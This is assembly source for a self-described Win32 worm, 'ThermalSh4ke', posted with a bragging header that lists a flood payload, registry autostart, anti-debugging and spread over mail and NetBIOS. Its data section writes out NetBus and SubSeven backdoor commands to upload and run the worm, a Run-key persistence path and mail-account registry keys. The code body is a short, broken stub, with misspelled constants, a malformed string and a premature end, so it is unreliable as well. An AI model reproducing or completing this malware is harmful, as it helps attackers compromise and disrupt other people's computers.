;; Win32.ThermalSh4ke
;;
;; Comment:
;;    Heyyyyy guyyzz! Time to introduce Win32.ThermalSh4ke:
;;    A self-*spreading* parAsitic feather-weight internet-worm. It
;;    is one of my first ever polymorphic generic malware for the Win32.
;;    As it is a perfect opporunity to show my BlaCk-H@ skillzz. xD.
;;    HoweveR, Im still a n0ob in asm sO the C0de mighT be buggY. However,
;;    The worm body is still unfinished, so don't expect much!
;;
;; General sheet of characteristics:
;;    Name of the virus.............: Win32.ThermalSh4ke
;;    Author........................: Timo 'HaZeL' Sarkar / March 2021
;;    Size..........................: On 1st generation: approx. 60 bytes
;;    Compiled size.................: On 1st generation: approx.
;;    Payloads......................: Yes: DOS ICMP Flood on 31st of month
;;    Targets.......................: Win32 (Windoze 2k/7/8/10)
;;    Auto-startup..................: Registers dropped binaries in Sysreg
;;    Spread-techniques.............: Outlook/Mail and NetBios backdoor
;;    Encrypted.....................: Yes
;;    Anti-debugging................: Yes
;;    Polymorphic...................: Yes
;;    Metamorphic...................: Yes
;;    OS-Residence..................: Ring 0 and Ring 3
;; 
;; Greetingzzz:
;;    Greetingz go to Z0mbie (Creator of Zmist), The Mental Driller 
;;    (Creator of Metaph0r), x2-dev: for the good advisory and greetz 
;;    to the 29/A group!

.386
.MODEL  FLAT
.DATA

JUMPS

;; Definition utilities for the little-endian calculation
DBWI        MACRO   LIL_ENDIAN
            DW      (LIL_ENDIAN SHR 8) + ((LIL_ENDIAN AND 00FFh) SHL 8)
ENDM

EXTRN       WSAGetLastError:PROC
EXTRN       ioctlsocket:PROC 
EXTRN       ExitProcess:PROC 
EXTRN       WSAStartup:PROC 
EXTRN       WritePrivateProfileStringA:PROC
EXTRN       WSACleanup:PROC
EXTRN       socket:PROC
EXTRN       closesocket:PROC
EXTRN       setsocketopt:PROC
EXTRN       InternetGetConnectedState:PROC
EXTRN       DeleteFileA:PROC
EXTRN       connect:PROC
EXTRN       setsockopt:PROC
EXTRN       PeekMessageA:PROC
EXTRN       SetFileAttributesA:PROC
EXTRN       GetSystemDirectoryA:PROC
EXTRN       CreateFileA:PROC
EXTRN       recv:PROC
EXTRN       send:PROC
EXTRN       sendto:PROC
EXTRN       CloseHandle:PROC
EXTRN       GetSystemTime:PROC
EXTRN       GetModuleHandle
EXTRN       RegOpenKeyExA:PROC
EXTRN       RegSetValueExA:PROC
EXTRN       RegCloseKey:PROC
EXTRN       ReadFile:PROC
EXTRN       CopyFileA:PROC
EXTRN       WNetAddConnection2A:PROC
EXTRN       WNetCancelConnection2A:PROC
EXTRN       SetErrorMode:PROC
EXTRN       GetModuleFileNameA:PROC
EXTRN       FindWindowA:PROC
EXTRN       PostMessageA:PROC
EXTRN       GetTickCount:PROC
EXTRN       WriteFile:PROC
EXTRN       GetLocalTime:PROC
EXTRN       WinExec:PROC
EXTRN       select:PROC
EXTRN       GetPrivateProfileStringA:PROC
EXTRN       GetModuleHandleA:PROC
EXTRN       GetProcAddress:PROC
EXTRN       WNetAddConnection2A:PROC
EXTRN       WNetEnumResourceA:PROC
EXTRN       WNetOpenEnumA:PROC
EXTRN       WNetCloseEnum:PROC
EXTRN       RegQueryValueExA:PROC
EXTRN       gethostbyname:PROC
EXTRN       inet_ntoa:PROC

;; Some constant definitions, that get important later
WORM_SIZE                   EQU     60
SEM_NOGPFAUL_TERRORBOX      EQU     00000002h
OPEN_EXISTING               EQU     00000003h
CREATE_ALWAYS               EQU     00000002h
SO_SNDTIMEO                 EQU     1005h
SO_RCVTIMEO                 EQU     1006h
RESSOURCE_GLOBALNET         EQU     00000002h
RESSOURCEUSAGE_CONNECTABLE  EQU     00000001h
RESSOURCEUSAGE_CONTAINER    EQU     00000002h
RESSOURCEUSAGE_CONNECTABLE  EQU     00000001h
RESSOURCETYPE_DISK          EQU     00000001h
SOL_SOCKET                  EQU     0FFFFh
HKEY_CURRENT_USER           EQU     80000001h
KEY_QUERY_VALUE             EQU     1
KEY_WRITE                   EQU     00020006h
REG_SZ                      EQU     00000001h
GENERIC_READ                EQU     80000000h
GENERIC_WRITE               EQU     40000000h
FILE_SHARE_READ             EQU     00000001h
FILE_ATTRIBUTE_HIDDEN       EQU     2
AF_INET                     EQU     2
IPPROTO_IGMP                EQU     2
SOCK_STREAM                 EQU     1
SOCK_RAW                    EQU     3
FIONBIO                     EQU     8004667Eh
WM_QUIT                     EQU     0012h

;; Define the binary name for uploading to SubSeven
UPLOAD_REQUEST              DB      "RTFThermalShake.exe"
END_UPLOAD_REQUEST
;; Define the primary worm-body size for the upload
UPLOAD_SIZE                 DB      "SFT0460"
END_UPLOAD_SIZE
;; Define the SubSEven execution request binary-name
EXEC_REQUEST                DB      "FMXThermalShake.exe"
END_EXEC_REQUEST
;; Define the Password for interfacing with the NetBUS service
NETBUS_PASSWORD             DB      "Password;1;netbus", 0Dh
END_NETBUS_PASSWORD
;; Define function for dealing with the NetBUS upload request
NETBUS_UPLOAD_REQUEST       DB      "UploadFile;ThermalShake.exe;60;\", 0Dh
END_NETBUS_UPLOAD_REQUEST
;; Define function for executing the received binary-file
NETBUS_EXEC_FILE            DB      "StartApp;\ThermalShake.exe", 0Dh
END_NETBUS_EXEC_FILE
;; Definitions of other miscellaneous functions and variables
DEFINITIVE_NUKE_FILE        DB      "BBQ666.COM", 0
SZ_KERNEL32                 DB      "KERNEL32", 0
SZ_REGSERVPROC              DB      "RegisterServiceProcess", 0
WIN_INI_RUN_KEY             DB      "run", 0
WIN_SECTION                 DB      "windows", 0
RUN_KEY                     DB      "Software\Microsoft\CurrentVersion\Run", 0

REG_HANDLE_1                DD      0
REG_HANDLE_2                DD      0                
SZ_ACCOUNT_MGR              DB      "Software\Microsoft\Internet Account Manager", 0
ACCOUNT_KEY                 DB      "Software\Microsoft\Internet Account Manager\Accounts\"
ACCOUNT_INDEX               DB      "00000000", 0
SZ_DEF_NEWS_ACC             DB      "Default News Account", 0
SZ_NNTP_SERVER              DB      "NNTP Server", 0

SIZE_ACCOUNT_BUFFER         DD      9
SIZE_NNTP_BUFFER            DD      128

S_POST                      DB      "POST", 0Dh, 0Ah
S_QUIT                      DB      "QUIT", 0Dh, 0Ah

;; Definition of ThermalShake Generation 2 in Outlook. Here
;; resides his malware-header... 
NEWS_MESSAGE                DB      "From: 'HaZzeL' <heaven@rainbow.pony>", 0Dh, 0Ah
                            DB      "Subject: ThermalShake was here... xD", 0Dh, 0Ah
                            DB      "Newsgroups: heaven.ponyfoo", 0Dh, 0Ah
                            DB      0Dh, 0Ah
                            DB      "HeYy y0u stuPid uSer...", 0Dh, 0Ah
                            DB      "y0uR S3cuRitY is hella bAd xD. Pleas3 st0p hAvIng Fun & stArt fiXing your SoftW4re!", 0Dh, 0Ah
                            DB      "ThermalShake was here... Next T1me Stop play!ng aroUnd wiTh aggressive M4lware", 0Dh, 0Ah
                            DB      "Greetzz: HaZzel xD", 0Dh, 0Ah
                            DB      ".", 0Dh, 0Ah
END_NEWS_MESSAGE:

;; Begin of real horror... This section contains all the worm body 
;; that includes thze polymorphic engine and the 31st technique as well
;; as thze NetBUS/NezBIOS backdoor. Have fun :D
                .CODE
                DB          "[-T2IR-]"", 0
START:
                PUSH        SEM_NOGPFAULTERRORBOX   ;; On error, just swim further
                CALL        SetErrorMode            ;; Whithout having a junk

                PUSH        0
                PUSH        0
                PUSH        0
                PUSH        0
                PUSH        0
                CALL        PeekMessageA

                ;; Get the real offset from CreateFileA in the jmp-table
                MOV         ESI, DWORD PTR CreateFileA+2
                LODSD
END START
